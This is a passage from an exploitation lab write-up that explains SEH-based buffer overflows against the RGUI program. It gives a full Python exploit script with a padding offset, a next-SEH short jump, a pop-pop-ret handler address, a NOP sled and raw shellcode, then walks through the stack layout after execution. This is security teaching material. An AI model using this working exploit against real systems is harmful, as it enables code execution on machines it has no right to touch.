![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MfSUGGvtRNC7WOVCmJV%252F-MfSawkm1IE5W_fZ7kiE%252Fimage.png%3Falt%3Dmedia%26token%3D859daed7-8d77-4440-90e2-c51bf4f586a0&width=768&dpr=4&quality=100&sign=65d4c853&sv=2)

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#exploit)

Exploit

Let's see the full updated exploit code now:

exploit.py

Copy

    f = open("payload.txt", "wb")
    
    # Offset into the first SEH record
    payload = b"A" * 1012
    
    # Address of the next SEH record
    # payload += b"BOOM"
    payload += b"\xeb\x06\x90\x90"
    
    # Current SEH handler (pop pop ret)
    payload += b"\xc8\x12\x94\x63"
    
    # NOP sled for reliability
    payload += b"\x90"*10
    
    # shellcode
    buf = b""
    buf += b"\xba\xbf\xaf\x65\x1b\xd9\xc4\xd9\x74\x24\xf4\x5d\x31"
    buf += b"\xc9\xb1\x31\x31\x55\x13\x83\xed\xfc\x03\x55\xb0\x4d"
    buf += b"\x90\xe7\x26\x13\x5b\x18\xb6\x74\xd5\xfd\x87\xb4\x81"
    buf += b"\x76\xb7\x04\xc1\xdb\x3b\xee\x87\xcf\xc8\x82\x0f\xff"
    buf += b"\x79\x28\x76\xce\x7a\x01\x4a\x51\xf8\x58\x9f\xb1\xc1"
    buf += b"\x92\xd2\xb0\x06\xce\x1f\xe0\xdf\x84\xb2\x15\x54\xd0"
    buf += b"\x0e\x9d\x26\xf4\x16\x42\xfe\xf7\x37\xd5\x75\xae\x97"
    buf += b"\xd7\x5a\xda\x91\xcf\xbf\xe7\x68\x7b\x0b\x93\x6a\xad"
    buf += b"\x42\x5c\xc0\x90\x6b\xaf\x18\xd4\x4b\x50\x6f\x2c\xa8"
    buf += b"\xed\x68\xeb\xd3\x29\xfc\xe8\x73\xb9\xa6\xd4\x82\x6e"
    buf += b"\x30\x9e\x88\xdb\x36\xf8\x8c\xda\x9b\x72\xa8\x57\x1a"
    buf += b"\x55\x39\x23\x39\x71\x62\xf7\x20\x20\xce\x56\x5c\x32"
    buf += b"\xb1\x07\xf8\x38\x5f\x53\x71\x63\x35\xa2\x07\x19\x7b"
    buf += b"\xa4\x17\x22\x2b\xcd\x26\xa9\xa4\x8a\xb6\x78\x81\x65"
    buf += b"\xfd\x21\xa3\xed\x58\xb0\xf6\x73\x5b\x6e\x34\x8a\xd8"
    buf += b"\x9b\xc4\x69\xc0\xe9\xc1\x36\x46\x01\xbb\x27\x23\x25"
    buf += b"\x68\x47\x66\x46\xef\xdb\xea\xa7\x8a\x5b\x88\xb7"
    payload += buf
    
    f.write(payload)
    f.close()

Let's send the payload to RGUI and observe the stack once the payload is sent to the program:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-Meup6Xk2QGlcviMpTRs%252Fimage.png%3Falt%3Dmedia%26token%3Dea29b17a-1908-4b50-a068-d9895c97645c&width=768&dpr=4&quality=100&sign=3363dda7&sv=2)

Stack memory layout after the payload is sent to the program

Below gif captures the full exploitation process:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-MeugQXekt_9o-8tlI9H%252Fseh-overflow-exploit.gif%3Falt%3Dmedia%26token%3D9df73270-83ac-4d07-976a-036e6db7f1ec&width=768&dpr=4&quality=100&sign=9c3fd252&sv=2)

Confirming our SEH overflow exploit works

From above screenshot, note the following key points:

*   Once we're at `0141E768`, relative short `jmp + 6` jumps to the start of our `NOP` sled at `0141E770`;
    
*   The `NOP` sled takes us to the start of our shellcode at `0141E77A`;
    
*   Once we hit F9 to resume execution, the shellcode is successfully executed and the calc is popped.
    

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#summary)

Summary


------------------------------------------------------------------------------------------------------------------------------------------------

We can summarize that SEH overflow exploitation at a high level works as shown in the below diagram:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mettkir7WIv7PLceGou%252F-Meuw2j9Pt0pwi0gnoe4%252Fimage.png%3Falt%3Dmedia%26token%3D30edd0e9-f768-43f9-84f5-03909a2d1fcd&width=768&dpr=4&quality=100&sign=c187442d&sv=2)

SEH overflow exploitation process overview

1.  Payload makes the program throw an exception;
    
2.  SEH handler kicks in, which has been overwritten with a memory address in the program that contains `pop pop ret` instructions;
    
3.  `Pop pop ret` instructions make the program jump to the next SEH record, which is overwritten with a short relative jump to the shellcode;
    
4.  Shellcode is executed.
    

We can update the above diagram with memory addresses that we observed in this lab like so:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mev-uhvZQUpE3cUGSa1%252F-Mev2N1sP0lHu6eCmiGH%252Fimage.png%3Falt%3Dmedia%26token%3D2c7fdddf-83e7-4f41-8dc3-e12e6f60c8d2&width=768&dpr=4&quality=100&sign=7a4a130&sv=2)

SEH overflow exploitation process as observed in the labs

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#references)
